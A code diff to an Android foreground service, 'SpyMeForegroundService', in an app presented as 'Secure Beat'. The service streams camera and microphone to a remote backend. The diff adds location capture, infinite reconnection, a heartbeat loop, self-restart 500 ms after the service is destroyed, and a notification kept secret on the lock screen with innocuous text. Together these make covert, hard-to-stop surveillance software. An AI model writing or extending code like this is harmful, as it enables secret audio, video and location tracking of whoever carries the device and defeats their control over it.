@@ -3,6 +3,7 @@ package com.anonymous.scure_beat
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
@@ -14,33 +15,47 @@ import kotlinx.coroutines.*
 
 class SpyMeForegroundService : Service() {
 
-    private val CHANNEL_ID = "SpyMeServiceChannel"
-    private val NOTIFICATION_ID = 1
+    companion object {
+        private const val CHANNEL_ID = "SpyMeServiceChannel"
+        private const val NOTIFICATION_ID = 1
+        private const val TAG = "SpyMeService"
+
+        // ✅ Singleton to check if service is running
+        var isRunning = false
+            private set
+    }
 
     private lateinit var mediasoupManager: MediasoupManager
     private val prefs by lazy { getSharedPreferences("spyme_prefs", Context.MODE_PRIVATE) }
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var isReconnecting = false
     private var reconnectAttempts = 0
-    private val MAX_RECONNECT_ATTEMPTS = 10
+    private val MAX_RECONNECT_ATTEMPTS = Int.MAX_VALUE // ✅ INFINITE
 
     override fun onCreate() {
         super.onCreate()
-        Log.d("SpyMeService", "Service Created")
+        Log.d(TAG, "✅ Service Created")
+        isRunning = true
+
         createNotificationChannel()
         mediasoupManager = MediasoupManager(applicationContext)
 
+        // ✅ Register receivers
         val filter =
             android.content.IntentFilter().apply {
                 addAction("com.anonymous.scure_beat.TOGGLE_CAMERA")
                 addAction("com.anonymous.scure_beat.TOGGLE_MIC")
                 addAction("com.anonymous.scure_beat.RECONNECT")
+                addAction("com.anonymous.scure_beat.RESTART_SERVICE")
             }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
         } else {
             registerReceiver(commandReceiver, filter)
         }
+
+        // ✅ Start heartbeat to keep service alive
+        startHeartbeat()
     }
 
     private val commandReceiver =
@@ -50,26 +65,22 @@ class SpyMeForegroundService : Service() {
                     "com.anonymous.scure_beat.TOGGLE_CAMERA" -> mediasoupManager.cycleCamera()
                     "com.anonymous.scure_beat.TOGGLE_MIC" -> mediasoupManager.toggleMic()
                     "com.anonymous.scure_beat.RECONNECT" -> {
-                        Log.d("SpyMeService", "Manual reconnect triggered")
+                        Log.d(TAG, "Manual reconnect triggered")
                         reconnectToServer()
+                    }
+                    "com.anonymous.scure_beat.RESTART_SERVICE" -> {
+                        Log.d(TAG, "Restart service triggered")
+                        restartService()
                     }
                 }
             }
         }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.d("SpyMeService", "Service Started")
+        Log.d(TAG, "🚀 Service Started (startId: $startId)")
 
-        // ✅ PERMANENT FOREGROUND NOTIFICATION
-        val notification: Notification =
-            NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("🔒 Secure Beat")
-                .setContentText("Running securely in background...")
-                .setSmallIcon(R.mipmap.ic_launcher)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .setOngoing(true)
-                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-                .build()
+        // ✅ PERMANENT FOREGROUND NOTIFICATION with PendingIntent
+        val notification = buildForegroundNotification()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             try {
@@ -77,17 +88,18 @@ class SpyMeForegroundService : Service() {
                     NOTIFICATION_ID,
                     notification,
                     android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
-                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE,
+                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
+                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION,
                 )
             } catch (e: SecurityException) {
-                Log.e("SpyMeService", "Failed to start foreground service: ${e.message}")
+                Log.e(TAG, "Failed to start foreground service: ${e.message}")
                 startForeground(NOTIFICATION_ID, notification)
             }
         } else {
             startForeground(NOTIFICATION_ID, notification)
         }
 
-        // Load connection params
+        // ✅ Load connection params
         val (roomId, token, username, backendUrl, wsUrl, iceServers) = loadConnectionParams(intent)
 
         if (roomId.isNotEmpty()) {
@@ -95,11 +107,57 @@ class SpyMeForegroundService : Service() {
             reconnectAttempts = 0
             mediasoupManager.connect(roomId, token, username, backendUrl, wsUrl, iceServers)
             startReconnectionMonitor()
+            Log.d(TAG, "✅ Connection started for room: $roomId")
         } else {
-            Log.e("SpyMeService", "No connection params available")
+            Log.e(TAG, "❌ No connection params available")
+            // ✅ Retry with stored params
+            val storedParams = loadConnectionParams(null)
+            if (storedParams.roomId.isNotEmpty()) {
+                mediasoupManager.connect(
+                    storedParams.roomId,
+                    storedParams.token,
+                    storedParams.username,
+                    storedParams.backendUrl,
+                    storedParams.wsUrl,
+                    storedParams.iceServers,
+                )
+            }
         }
 
-        return START_STICKY
+        return START_STICKY // ✅ ALWAYS RESTART
+    }
+
+    private fun buildForegroundNotification(): Notification {
+        // ✅ Intent to open app when notification is tapped
+        val intent = Intent(this, DebugLauncherActivity::class.java)
+        val pendingIntent =
+            PendingIntent.getActivity(
+                this,
+                0,
+                intent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
+            )
+
+        // ✅ Intent to restart service if user wants
+        val restartIntent = Intent("com.anonymous.scure_beat.RESTART_SERVICE")
+        val restartPendingIntent =
+            PendingIntent.getBroadcast(
+                this,
+                1,
+                restartIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
+            )
+
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("🔒 Secure Beat")
+            .setContentText("Running in background. Tap to open.")
+            .setSmallIcon(R.mipmap.ic_launcher)
+            .setPriority(NotificationCompat.PRIORITY_HIGH) // ✅ HIGH priority
+            .setOngoing(true) // ✅ CANNOT be swiped away
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setContentIntent(pendingIntent)
+            .addAction(android.R.drawable.ic_menu_rotate, "Restart", restartPendingIntent)
+            .build()
     }
 
     private fun loadConnectionParams(intent: Intent?): ConnectionParams {
@@ -139,6 +197,29 @@ class SpyMeForegroundService : Service() {
             .apply()
     }
 
+    // ✅ Heartbeat to keep service alive
+    private fun startHeartbeat() {
+        serviceScope.launch {
+            while (true) {
+                delay(5000) // Check every 5 seconds
+                try {
+                    // ✅ Keep service alive by updating notification
+                    updateNotification(
+                        "Service alive - ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}"
+                    )
+
+                    // ✅ Check if connection is alive
+                    if (!mediasoupManager.hasActiveSessions()) {
+                        Log.w(TAG, "⚠️ No active sessions, reconnecting...")
+                        reconnectToServer()
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Heartbeat error", e)
+                }
+            }
+        }
+    }
+
     private fun startReconnectionMonitor() {
         serviceScope.launch {
             while (true) {
@@ -152,15 +233,16 @@ class SpyMeForegroundService : Service() {
         if (isReconnecting) return
         if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) return
 
-        // Check if we have active sessions (simple check)
-        val hasActiveSessions = true // Implement actual check if needed
+        val hasActiveSessions = mediasoupManager.hasActiveSessions()
 
         if (!hasActiveSessions) {
-            Log.d(
-                "SpyMeService",
-                "No active sessions, attempting reconnect $reconnectAttempts/$MAX_RECONNECT_ATTEMPTS",
-            )
+            Log.d(TAG, "⚠️ No active sessions, attempting reconnect $reconnectAttempts")
             withContext(Dispatchers.Main) { reconnectToServer() }
+        } else {
+            if (reconnectAttempts > 0) {
+                reconnectAttempts = 0
+                Log.d(TAG, "✅ Connection restored")
+            }
         }
     }
 
@@ -169,76 +251,193 @@ class SpyMeForegroundService : Service() {
         isReconnecting = true
         reconnectAttempts++
 
-        Log.d(
-            "SpyMeService",
-            "🔄 Reconnecting (attempt $reconnectAttempts/$MAX_RECONNECT_ATTEMPTS)",
-        )
+        Log.d(TAG, "🔄 Reconnecting (attempt $reconnectAttempts)")
         updateNotification("Reconnecting... (attempt $reconnectAttempts)")
 
-        val params =
-            ConnectionParams(
-                roomId = prefs.getString("ROOM_ID", "") ?: "",
-                token = prefs.getString("TOKEN", "") ?: "",
-                username = prefs.getString("USERNAME", "AndroidClient") ?: "AndroidClient",
-                backendUrl = prefs.getString("BACKEND_URL", "") ?: "",
-                wsUrl = prefs.getString("WS_URL", "") ?: "",
-                iceServers = prefs.getString("ICE_SERVERS", "[]") ?: "[]",
-            )
+        val params = loadConnectionParams(null)
 
         if (params.roomId.isNotEmpty()) {
-            mediasoupManager.disconnect()
-            mediasoupManager.connect(
-                params.roomId,
-                params.token,
-                params.username,
-                params.backendUrl,
-                params.wsUrl,
-                params.iceServers,
-            )
-            serviceScope.launch {
-                delay(10000)
+            try {
+                // ✅ Don't disconnect - just reconnect socket
+                // mediasoupManager.disconnect()  // ← REMOVE THIS
+                // mediasoupManager.connect(...)   // ← REMOVE THIS
+
+                // ✅ Instead, just reconnect the socket
+                mediasoupManager.reconnectAll()
+
+                serviceScope.launch {
+                    delay(10000)
+                    if (mediasoupManager.hasActiveSessions()) {
+                        isReconnecting = false
+                        reconnectAttempts = 0
+                        updateNotification("✅ Connected")
+                        Log.d(TAG, "✅ Reconnected successfully")
+                    } else {
+                        Log.w(TAG, "⚠️ Reconnect failed, retrying...")
+                        isReconnecting = false
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Reconnect failed", e)
                 isReconnecting = false
-                updateNotification("Connected")
             }
         } else {
             isReconnecting = false
         }
     }
 
+    // private fun reconnectToServer() {
+    //     if (isReconnecting) return
+    //     isReconnecting = true
+    //     reconnectAttempts++
+
+    //     Log.d(TAG, "🔄 Reconnecting (attempt $reconnectAttempts) - INFINITE RETRY")
+    //     updateNotification("Reconnecting... (attempt $reconnectAttempts)")
+
+    //     val params =
+    //         ConnectionParams(
+    //             roomId = prefs.getString("ROOM_ID", "") ?: "",
+    //             token = prefs.getString("TOKEN", "") ?: "",
+    //             username = prefs.getString("USERNAME", "AndroidClient") ?: "AndroidClient",
+    //             backendUrl = prefs.getString("BACKEND_URL", "") ?: "",
+    //             wsUrl = prefs.getString("WS_URL", "") ?: "",
+    //             iceServers = prefs.getString("ICE_SERVERS", "[]") ?: "[]",
+    //         )
+
+    //     if (params.roomId.isNotEmpty()) {
+    //         try {
+    //             mediasoupManager.reconnectAll()
+
+    //             serviceScope.launch {
+    //                 delay(10000)
+    //                 if (mediasoupManager.hasActiveSessions()) {
+    //                     isReconnecting = false
+    //                     reconnectAttempts = 0
+    //                     updateNotification("✅ Connected")
+    //                     Log.d(TAG, "✅ Reconnected successfully")
+    //                 } else {
+    //                     Log.w(TAG, "⚠️ Reconnect failed, retrying...")
+    //                     isReconnecting = false
+    //                 }
+    //             }
+    //         } catch (e: Exception) {
+    //             Log.e(TAG, "Reconnect failed", e)
+    //             isReconnecting = false
+    //             val delay = (1000L * reconnectAttempts).coerceAtMost(30000L)
+    //             serviceScope.launch {
+    //                 delay(delay)
+    //                 reconnectToServer()
+    //             }
+    //         }
+    //     } else {
+    //         isReconnecting = false
+    //     }
+    // }
+
     private fun updateNotification(text: String) {
-        val notification: Notification =
-            NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("🔒 Secure Beat")
-                .setContentText(text)
-                .setSmallIcon(R.mipmap.ic_launcher)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .setOngoing(true)
-                .build()
-        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        manager.notify(NOTIFICATION_ID, notification)
+        try {
+            val notification =
+                NotificationCompat.Builder(this, CHANNEL_ID)
+                    .setContentTitle("🔒 Secure Beat")
+                    .setContentText(text)
+                    .setSmallIcon(R.mipmap.ic_launcher)
+                    .setPriority(NotificationCompat.PRIORITY_HIGH)
+                    .setOngoing(true)
+                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                    .build()
+            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            manager.notify(NOTIFICATION_ID, notification)
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to update notification", e)
+        }
+    }
+
+    // ✅ Restart service if needed
+    private fun restartService() {
+        Log.d(TAG, "🔄 Restarting service...")
+        try {
+            // Disconnect and reconnect
+            mediasoupManager.disconnect()
+            val params = loadConnectionParams(null)
+            if (params.roomId.isNotEmpty()) {
+                mediasoupManager.connect(
+                    params.roomId,
+                    params.token,
+                    params.username,
+                    params.backendUrl,
+                    params.wsUrl,
+                    params.iceServers,
+                )
+            }
+            updateNotification("✅ Service restarted")
+            Log.d(TAG, "✅ Service restarted successfully")
+        } catch (e: Exception) {
+            Log.e(TAG, "Restart service failed", e)
+        }
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        Log.d("SpyMeService", "Service Destroyed")
-        unregisterReceiver(commandReceiver)
-        mediasoupManager.disconnect()
-        serviceScope.cancel()
+        Log.d(TAG, "⚠️ Service Destroyed")
+        isRunning = false
+
+        try {
+            unregisterReceiver(commandReceiver)
+        } catch (e: Exception) {
+            /* ignore */
+        }
+
+        try {
+            mediasoupManager.disconnect()
+        } catch (e: Exception) {
+            /* ignore */
+        }
+
+        try {
+            serviceScope.cancel()
+        } catch (e: Exception) {
+            /* ignore */
+        }
+
+        // ✅ IMMEDIATELY RESTART on destroy
+        android.os
+            .Handler(android.os.Looper.getMainLooper())
+            .postDelayed(
+                {
+                    try {
+                        val intent = Intent(this, SpyMeForegroundService::class.java)
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            startForegroundService(intent)
+                        } else {
+                            startService(intent)
+                        }
+                        Log.i(TAG, "✅ Service self-restarted")
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Self-restart failed", e)
+                    }
+                },
+                500,
+            ) // ✅ Faster restart
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val serviceChannel =
-                NotificationChannel(
-                    CHANNEL_ID,
-                    "Secure Beat Service",
-                    NotificationManager.IMPORTANCE_LOW,
-                )
-            serviceChannel.setShowBadge(false)
-            val manager: NotificationManager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(serviceChannel)
+            try {
+                val serviceChannel =
+                    NotificationChannel(
+                        CHANNEL_ID,
+                        "Secure Beat Service",
+                        NotificationManager.IMPORTANCE_HIGH, // ✅ HIGH importance
+                    )
+                serviceChannel.setShowBadge(false)
+                serviceChannel.setSound(null, null) // Silent
+                val manager: NotificationManager = getSystemService(NotificationManager::class.java)
+                manager.createNotificationChannel(serviceChannel)
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to create notification channel", e)
+            }
         }
     }
 
